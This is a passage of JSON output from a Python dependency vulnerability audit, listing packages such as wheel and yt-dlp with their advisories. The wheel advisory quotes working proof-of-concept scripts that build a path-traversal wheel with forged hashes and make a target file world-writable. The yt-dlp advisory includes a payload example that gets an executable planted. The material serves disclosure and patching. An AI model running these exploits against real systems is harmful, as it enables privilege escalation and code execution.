content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source."}]}, {"name": "userpath", "version": "1.9.1", "vulns": []}, {"name": "uvicorn", "version": "0.40.0", "vulns": []}, {"name": "vulture", "version": "2.14", "vulns": []}, {"name": "wadllib", "version": "1.3.6", "vulns": []}, {"name": "websockets", "version": "10.4", "vulns": []}, {"name": "werkzeug", "version": "3.1.5", "vulns": []}, {"name": "wheel", "version": "0.42.0", "vulns": [{"id": "CVE-2026-24049", "fix_versions": ["0.46.2"], "aliases": ["GHSA-8rrh-rw8j-w5fx"], "description": "### Summary  - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.    - **Root Cause Component:** wheel.cli.unpack.unpack function.    - **Affected Packages:**      1. wheel (Upstream source)      2. setuptools (Downstream, vendors wheel)    - **Severity:** High (Allows modifying system file permissions).    ### Details   The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.   ``` # Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel) for zinfo in wf.filelist:     wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile      # (2) VULNERABILITY:     # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.     # If zinfo.filename contains \"../\", this targets files outside the destination.     permissions = zinfo.external_attr >> 16 & 0o777     destination.joinpath(zinfo.filename).chmod(permissions) ```    ### PoC   I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.    **Prerequisites:** pip install setuptools    **Step 1: Generate the Malicious Wheel (gen_poc.py)**   This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.   ``` import zipfile import hashlib import base64 import os  def urlsafe_b64encode(data):     \"\"\"     Helper function to encode data using URL-safe Base64 without padding.     Required by the Wheel file format specification.     \"\"\"     return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')  def get_hash_and_size(data_bytes):     \"\"\"     Calculates SHA-256 hash and size of the data.     These values are required to construct a valid 'RECORD' file,     which is used by the 'wheel' library to verify integrity.     \"\"\"     digest = hashlib.sha256(data_bytes).digest()     hash_str = \"sha256=\" + urlsafe_b64encode(digest)     return hash_str, str(len(data_bytes))  def create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):     print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")      # 1. Prepare Standard Metadata Content     # These are minimal required contents to make the wheel look legitimate.     wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"     metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"         # 2. Define Malicious Payload (Path Traversal)     # The content doesn't matter, but the path does.     payload_content = b\"PWNED by Path Traversal\"      # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'     # The vulnerability allows 'chmod' to affect this path directly.     malicious_path = \"../../poc_target.txt\"      # 3. Calculate Hashes for Integrity Check Bypass     # The 'wheel' library verifies if the file hash matches the RECORD entry.     # To bypass this check, we calculate the correct hash for our malicious file.     wheel_hash, wheel_size = get_hash_and_size(wheel_content)     metadata_hash, metadata_size = get_hash_and_size(metadata_content)     payload_hash, payload_size = get_hash_and_size(payload_content)      # 4. Construct the 'RECORD' File     # The RECORD file lists all files in the wheel with their hashes.     # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.     # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.     record_lines = [         f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",         f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",         f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path         \"evil-1.0.dist-info/RECORD,,\"     ]     record_content = \"\\n\".join(record_lines).encode('utf-8')      # 5. Build the Zip File     with zipfile.ZipFile(filename, \"w\") as zf:         # Write standard metadata files         zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)         zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)         zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)          # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file         # We need to set specific permission bits to trigger the vulnerability.         zinfo = zipfile.ZipInfo(malicious_path)                 # Set external attributes to 0o777 (rwxrwxrwx)         # Upper 16 bits: File type (0o100000 = Regular File)         # Lower 16 bits: Permissions (0o777 = World Writable)         # The vulnerable 'unpack' function will blindly apply this '777' to the system file.         zinfo.external_attr = (0o100000 | 0o777) << 16                 zf.writestr(zinfo, payload_content)      print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")  if __name__ == \"__main__\":     create_evil_wheel_v4() ```    **Step 2: Run the Exploit (exploit.py)**   ``` from pathlib import Path import sys  # Demonstrating impact on setuptools try:     from setuptools._vendor.wheel.cli.unpack import unpack     print(\"[*] Loaded unpack from setuptools\") except ImportError:     from wheel.cli.unpack import unpack     print(\"[*] Loaded unpack from wheel\")  # 1. Setup Target (Read-Only system file simulation) target = Path(\"poc_target.txt\") target.write_text(\"SENSITIVE CONFIG\") target.chmod(0o400) # Read-only print(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")  # 2. Run Vulnerable Unpack # The wheel contains \"../../poc_target.txt\". # unpack() will extract safely, BUT chmod() will hit the actual target file. try:     unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\") except Exception as e:     print(f\"[!] Ignored expected extraction error: {e}\")  # 3. Check Result final_perms = oct(target.stat().st_mode)[-3:] print(f\"[*] Final Perms: {final_perms}\")  if final_perms == \"777\":     print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\") else:     print(\"[-] Attack failed.\") ```    **result:**   <img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />      ### Impact   Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.    ### Recommended Fix   The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().    ### Suggested Patch:   ``` # extract() returns the actual path where the file was written extracted_path = wf.extract(zinfo, destination)  # Only apply chmod if a file was actually written if extracted_path:     permissions = zinfo.external_attr >> 16 & 0o777     Path(extracted_path).chmod(permissions) ```"}]}, {"name": "xdg", "version": "5", "vulns": []}, {"name": "xkit", "skip_reason": "Dependency not found on PyPI and could not be audited: xkit (0.0.0)"}, {"name": "yarl", "version": "1.22.0", "vulns": []}, {"name": "yt-dlp", "version": "2024.4.9", "vulns": [{"id": "CVE-2024-38519", "fix_versions": ["2024.7.1"], "aliases": ["GHSA-79w7-vh3h-8g4j"], "description": "### Summary `yt-dlp` does not limit the extensions of downloaded files, which could lead to arbitrary filenames being created in the download folder (and path traversal on Windows). Since `yt-dlp` also reads config from the working directory (and on Windows executables will be executed from the yt-dlp directory) this could lead to arbitrary code being executed.  ### Patches `yt-dlp` version 2024.07.01 fixes this issue by whitelisting the allowed extensions. This means some very uncommon extensions might not get downloaded; however, it will also limit the possible exploitation surface.  ### Workarounds It is recommended to upgrade yt-dlp to version 2024.07.01 as soon as possible, **always** have `.%(ext)s` at the end of the output template, and make sure you trust the websites that you are downloading from. Also, make sure to never download to a directory within PATH or other sensitive locations like your user directory, `system32`, or other binaries locations.  For users not able to upgrade: - Make sure the extension of the media to download is a common video/audio/sub/... one - Try to avoid the generic extractor (`--ies default,-generic`) - Keep the default output template (`-o \"%(title)s [%(id)s].%(ext)s`) - Omit any of the subtitle options (`--write-subs`, `--write-auto-subs`, `--all-subs`, `--write-srt`) - Use `--ignore-config --config-location ...` to not load config from common locations  ### Details One potential exploitation might look like this:  From a mimetype we do not know, we default to trimming the leading bit and using the remainder. Given a webpage that contains ```html <script type=\"application/ld+json\"> {     \"@context\": \"https://schema.org\",     \"@type\": \"VideoObject\",     \"name\": \"ffmpeg\",     \"encodingFormat\": \"video/exe\",     \"contentUrl\": \"https://example.com/video.mp4\" } </script> ``` this will try and download a file called `ffmpeg.exe` (`-o \"%(title)s.%(ext)s`). `ffmpeg.exe` will be searched for in the current directory, and so upon the next run arbitrary code can be executed.  Alternatively, when engineering a file called `yt-dlp.conf` to be created, the config file could contain `--exec ...` and so would also execute arbitrary code.  ### Acknowledgement A big thanks to @JarLob for independently finding a new application of the same underlying issue. More can be read about on the dedicated GitHub Security Lab disclosure here: [Path traversal saving subtitles (GHSL-2024-090)](<https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp>)  ### References - https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j - https://nvd.nist.gov/vuln/detail/CVE-2024-38519 - https://github.com/yt-dlp/yt-dlp/releases/tag/2024.07.01 - https://github.com/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a - https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp "}, {"id": "GHSA-3v33-3wmw-3785", "fix_versions": ["2024.7.7"], "aliases": [], "description": "### Impact yt-dlp's DouyuTV and DouyuShow extractors used a `cdn.bootcdn.net` URL as a fallback for fetching a component of the crypto-js JavaScript library. When the Douyu extractor is used, yt-dlp extracts this JavaScript code and attempts to execute it externally using [PhantomJS](https://github.com/ariya/phantomjs). `bootcdn.net` is owned by the bad actor responsible for the [Polyfill JS supply chain attack](https://sansec.io/research/polyfill-supply-chain-attack) that has been ongoing since at least June 2023. While there is no evidence that PhantomJS has been targeted by or is vulnerable to any attacks carried out by the Polyfill JS actor, there is the possibility that malicious JavaScript code may have been downloaded/cached by yt-dlp or executed by PhantomJS.  In order for this potential vulnerability to be exploited by any hypothetical attack, all 3 of the following conditions must be met: 1. The user has PhantomJS installed on their system. 2. The user passes a `douyu.com` or `douyutv.com` URL to yt-dlp as input, or passes a URL that redirects to one of these domains. 3. `cdnjs.cloudflare.com` is unavailable or blocked at the time of extraction, necessitating the usage of the `cdn.bootcdn.net` fallback; or it had been unavailable during a previous run of the Douyu extractor and JavaScript code from `cdn.bootcdn.net` had been cached to disk.  ### Patches yt-dlp version 2024.07.07 fixes this issue by removing the URL pointing to the malicious CDN and by invalidating any Douyu extractor cache data created by unpatched versions of yt-dlp.  ### Workarounds It is recommended to upgrade yt-dlp to version 2024.07.07 as soon as possible.  For users not able to upgrade: - Avoid using the Douyu extractors (`--ies default,-douyutv,-douyushow`) - Uninstall (or do not install) PhantomJS  ### Acknowledgement Thanks to @LeSuisse for [reporting this](https://github.com/yt-dlp/yt-dlp/pull/10347) promptly after `bootcdn.net` was discovered to be under control of the same bad actor behind the `polyfill.io` supply chain attack.  ### References - https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41 - https://sansec.io/research/polyfill-supply-chain-attack "}]}], "fixes": []}
